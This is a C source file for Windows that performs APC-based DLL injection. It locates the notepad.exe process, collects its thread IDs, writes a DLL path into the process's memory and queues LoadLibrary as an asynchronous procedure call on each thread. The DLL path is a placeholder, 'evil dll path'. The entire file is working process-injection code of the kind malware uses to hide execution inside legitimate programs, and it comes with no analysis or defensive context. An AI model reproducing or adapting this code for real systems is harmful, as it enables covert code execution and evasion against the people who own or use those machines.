#include "tchar.h"
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

#ifdef UNICODE
#define LOAD_LIBRARY "LoadLibraryW"
#else
#define LOAD_LIBRARY "LoadLibraryA"
#endif

int _tmain(int argc, TCHAR **argv)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD | TH32CS_SNAPPROCESS, NULL);
	HANDLE hTargetProcess = NULL;
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &processEntry))
	{
		while (wcscmp(processEntry.szExeFile, L"notepad.exe") != 0)
		{
			Process32Next(hSnapshot, &processEntry);
		}
	}
	printf("Found process id [%d]\n", processEntry.th32ProcessID);
	int targetProcessID = processEntry.th32ProcessID;

	THREADENTRY32 threadEntry = {};
	threadEntry.dwSize = sizeof(THREADENTRY32);
	int threadIdList[30];
	ZeroMemory(threadIdList, 30 * sizeof(int));

	if (Thread32First(hSnapshot, &threadEntry) == FALSE)
	{
		return 1;
	}
	int i = 0;
	while (i < 30)
	{
		if (threadEntry.th32OwnerProcessID == targetProcessID)
		{
			threadIdList[i] = threadEntry.th32ThreadID;
			i++;
		}
		if (Thread32Next(hSnapshot, &threadEntry) == FALSE)
		{
			break;
		}
	}
	printf("Found [%d] Threads in target process\r\n", i);

	HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessID);
	if (pHandle == NULL)
	{
		_tprintf(TEXT("Failed get process handle\r\n"));
		printf("Error code - %d", GetLastError());
		return 1;
	}

	TCHAR dllPath[] = TEXT("evil dll path");
	SIZE_T dllPathLen = (_tcslen(dllPath) + 1) * sizeof(TCHAR);

	LPVOID lpAddrAlloced = VirtualAllocEx(pHandle, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpAddrAlloced == NULL)
	{
		_tprintf(TEXT("Failed to alloc process memory\r\n"));
		printf("Error code - %d", GetLastError());
		return 1;
	}

	SIZE_T writed = 0;
	if (WriteProcessMemory(pHandle, lpAddrAlloced, dllPath, dllPathLen, &writed) == 0)
	{
		_tprintf(TEXT("Failed to write process memory\r\n"));
		printf("Error code - %d", GetLastError());
		return 1;
	}

	HMODULE hKernel = GetModuleHandle(TEXT("kernel32.dll"));
	if (hKernel == NULL)
	{
		return 1;
	}

	LPVOID lpLoadLibrary = GetProcAddress(hKernel, LOAD_LIBRARY);
	if (lpLoadLibrary == NULL)
	{
		return 1;
	}

	_tprintf(TEXT("injecting...\r\n"));

	for (int j = 0; j < i; j++)
	{
		HANDLE tHandle = OpenThread(THREAD_ALL_ACCESS, NULL, threadIdList[j]);
		if (tHandle)
		{
			if (QueueUserAPC((PAPCFUNC)lpLoadLibrary, tHandle, (ULONG_PTR)lpAddrAlloced))
			{
				_tprintf(TEXT("QueueUserAPC succeed for thread id [%d]\n"), threadIdList[j]);
			}
			else
			{
				_tprintf(TEXT("QueueUserAPC failed for thread id [%d]\n"), threadIdList[j]);
			}
		}
	}

	return 0;
}